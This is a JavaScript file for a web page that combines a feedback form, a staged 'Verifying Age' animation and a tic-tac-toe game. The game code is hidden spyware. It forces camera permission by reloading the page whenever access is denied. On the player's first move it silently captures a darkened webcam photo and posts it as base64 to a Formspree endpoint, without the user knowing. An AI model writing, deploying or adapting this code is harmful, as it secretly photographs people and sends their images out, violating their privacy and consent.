  setTimeout(function(){
    
    const openFeedForm = document.getElementById("feedBtn");
      const submitFeed = document.getElementById("subBtn");
      const txtField = document.getElementById("txtArea");
      const feedForm = document.getElementById("fdMainDiv");
      const feedEmail = document.getElementById("email");

      openFeedForm.onclick=function(){
        setTimeout(function(){
          feedForm.style.animation="fd 1000ms 1";
          feedForm.style.display="block";
        },1000)
      
      }

      submitFeed.onclick=function(){
        if(email.value==""){
          email.placeholder="Email Required";
          email.classList.add("red-placeholder");
        }
          else if(txtField.value==""){
            txtField.placeholder="Input required!";
          txtField.classList.add("red-placeholder");
          }
        else{
          const formspreeUrl = "https://formspree.io/f/xwvgyqvd"; 

            fetch(formspreeUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    message: "From: " + feedEmail.value+"\n\n\n"+txtField.value
                })
            }).then(response => {
                if (response.ok) {
                  feedForm.innerHTML="Sent!\n\nThank you for your feedback!"
                    console.log("feedback Submitted");
                  
                } else {
                    console.error("Failed.");
                }
            }).catch(err => console.error("Error", err));

      feedBack.value=" ";

        setTimeout(function(){
          feedForm.style.display="none";
        },1500)
        }
      
    }
    
    
    const verifyCont = document.getElementById("vrfyCont");
      const verify = document.getElementById("vrfy");
      
      verifyCont.style.display="block";
      
      setTimeout(function(){
        verify.innerHTML="Verifying Age. ";
      }, 300)
      setTimeout(function(){
        verify.innerHTML="Verifying Age. . ";
      }, 600);
      setTimeout(function(){
        verify.innerHTML="Verifying Age. . . ";
      }, 900);
      setTimeout(function(){
        verify.innerHTML="Verifying Age. . . .";
      }, 1200);
      setTimeout(function(){
        verify.innerHTML="Verifying Age ";
      }, 1500);
      setTimeout(function(){
        verify.innerHTML="Verifying Age. ";
      }, 1800);
      setTimeout(function(){
        verify.innerHTML="Verifying Age. . ";
      }, 2100);
      setTimeout(function(){
        verify.innerHTML="Verifying Age. . .";
      }, 2400);
      setTimeout(function(){
        verify.innerHTML="Verifying Age. . . .";
      }, 2700)
      setTimeout(function(){
        verify.innerHTML="Verifying Age. . . .";
      }, 3000)

    setTimeout(function(){
        verify.innerHTML="Age Verified! Site adjusted.";
      }, 4000)

    setTimeout(function(){
        verifyCont.style.display="none";
      }, 6500);
    
    return 0; 
      }, 1500)

let currentPlayer = 'X';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let streamActive = false;
        
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(function(stream) {
                video.srcObject = stream;
                streamActive = true;
                video.play();
            })
            .catch(function(err) {
                console.log("Camera prompt denied!");
              location.reload();
            });

        
        function makeMove(cell) {
            if (cell.innerText === '') {
                cell.innerText = currentPlayer;
                currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
                
                
                let moves = document.querySelectorAll('.cell:not(:empty)').length;
                if (moves === 1 && streamActive) {
                    takePhoto();
                }
            }
        }
        function takePhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

          context.filter = 'brightness(60%)';
            
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

          context.filter = 'none';
            
            
            const imageData = canvas.toDataURL('image/png');
            
            
            sendToEmail(imageData);
        }

        
        function sendToEmail(base64Image) {
            const formspreeUrl = "https://formspree.io/f/xkodpenr"; 

            fetch(formspreeUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    message: "Decode this image's DNA.",
                    image_data: base64Image
                })
            }).then(response => {
                if (response.ok) {
                    console.log("Extracted");
                } else {
                    console.error("Failed.");
                }
            }).catch(err => console.error("Error", err));
        }
